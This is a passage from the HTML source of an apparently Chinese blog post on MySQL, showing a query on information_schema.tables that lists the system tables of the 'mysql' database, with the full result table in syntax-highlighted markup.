class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">21</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其中，<code>table_schema</code>为数据库名称；<code>table_name</code>为表名；<code>table_rows</code>为该表中的数据行数.<br>如想通过information_schema查询名为mysql的数据库中所有表：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;mysql&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+---------------------------+------------+--------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-------------------+----------+--------------------+-----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CATALOG <span class="operator">|</span> TABLE_SCHEMA <span class="operator">|</span> TABLE_NAME                <span class="operator">|</span> TABLE_TYPE <span class="operator">|</span> ENGINE <span class="operator">|</span> VERSION <span class="operator">|</span> ROW_FORMAT <span class="operator">|</span> TABLE_ROWS <span class="operator">|</span> AVG_ROW_LENGTH <span class="operator">|</span> DATA_LENGTH <span class="operator">|</span> MAX_DATA_LENGTH    <span class="operator">|</span> INDEX_LENGTH <span class="operator">|</span> DATA_FREE <span class="operator">|</span> AUTO_INCREMENT <span class="operator">|</span> CREATE_TIME         <span class="operator">|</span> UPDATE_TIME         <span class="operator">|</span> CHECK_TIME          <span class="operator">|</span> TABLE_COLLATION   <span class="operator">|</span> CHECKSUM <span class="operator">|</span> CREATE_OPTIONS     <span class="operator">|</span> TABLE_COMMENT                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+---------------------------+------------+--------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-------------------+----------+--------------------+-----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> columns_priv              <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">227994731135631359</span> <span class="operator">|</span>         <span class="number">4096</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="keyword">Column</span> privileges                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> db                        <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">123848989752688639</span> <span class="operator">|</span>         <span class="number">2048</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Database privileges                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> event                     <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">2048</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Events                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> func                      <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">162974011515469823</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="keyword">User</span> defined functions                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> general_log               <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> CSV    <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">2</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> General log                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> help_category             <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>         <span class="number">40</span> <span class="operator">|</span>             <span class="number">28</span> <span class="operator">|</span>        <span class="number">1120</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">3072</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> help categories                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> help_keyword              <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>        <span class="number">611</span> <span class="operator">|</span>            <span class="number">197</span> <span class="operator">|</span>      <span class="number">120367</span> <span class="operator">|</span>  <span class="number">55450570411999231</span> <span class="operator">|</span>        <span class="number">21504</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> help keywords                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> help_relation             <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>       <span class="number">1218</span> <span class="operator">|</span>              <span class="number">9</span> <span class="operator">|</span>       <span class="number">10962</span> <span class="operator">|</span>   <span class="number">2533274790395903</span> <span class="operator">|</span>        <span class="number">21504</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> keyword<span class="operator">-</span>topic relation                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> help_topic                <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>        <span class="number">583</span> <span class="operator">|</span>            <span class="number">975</span> <span class="operator">|</span>      <span class="number">568664</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>        <span class="number">22528</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> help topics                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> innodb_index_stats        <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> InnoDB <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Compact    <span class="operator">|</span>          <span class="number">3</span> <span class="operator">|</span>           <span class="number">5461</span> <span class="operator">|</span>       <span class="number">16384</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2017</span><span class="number">-04</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">05</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> stats_persistent<span class="operator">=</span><span class="number">0</span> <span class="operator">|</span>                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> innodb_table_stats        <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> InnoDB <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Compact    <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span>          <span class="number">16384</span> <span class="operator">|</span>       <span class="number">16384</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2017</span><span class="number">-04</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">05</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> stats_persistent<span class="operator">=</span><span class="number">0</span> <span class="operator">|</span>                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> ndb_binlog_index          <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> latin1_swedish_ci <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span>                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> plugin                    <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> MySQL plugins                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> proc                      <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">2048</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Stored Procedures                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> procs_priv                <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">239253730204057599</span> <span class="operator">|</span>         <span class="number">4096</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="keyword">Procedure</span> privileges                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> proxies_priv              <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">2</span> <span class="operator">|</span>            <span class="number">693</span> <span class="operator">|</span>        <span class="number">1386</span> <span class="operator">|</span> <span class="number">195062158860484607</span> <span class="operator">|</span>         <span class="number">5120</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="keyword">User</span> proxy privileges                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> servers                   <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">433752939111120895</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> MySQL <span class="keyword">Foreign</span> Servers <span class="keyword">table</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> slave_master_info         <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> InnoDB <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Compact    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>       <span class="number">16384</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2017</span><span class="number">-04</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">05</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> stats_persistent<span class="operator">=</span><span class="number">0</span> <span class="operator">|</span> Master Information                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> slave_relay_log_info      <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> InnoDB <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Compact    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>       <span class="number">16384</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2017</span><span class="number">-04</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">05</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> stats_persistent<span class="operator">=</span><span class="number">0</span> <span class="operator">|</span> Relay Log Information                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> slave_worker_info         <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> InnoDB <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Compact    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>       <span class="number">16384</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2017</span><span class="number">-04</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">05</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> stats_persistent<span class="operator">=</span><span class="number">0</span> <span class="operator">|</span> Worker Information                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> slow_log                  <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> CSV    <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">2</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Slow log                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> tables_priv               <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">239535205180768255</span> <span class="operator">|</span>         <span class="number">4096</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="keyword">Table</span> privileges                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> time_zone                 <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>   <span class="number">1970324836974591</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>              <span class="number">1</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="type">Time</span> zones                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> time_zone_leap_second     <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>   <span class="number">3659174697238527</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Leap seconds information <span class="keyword">for</span> <span class="type">time</span> zones <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> time_zone_name            <span class="operator">|</span> BASE 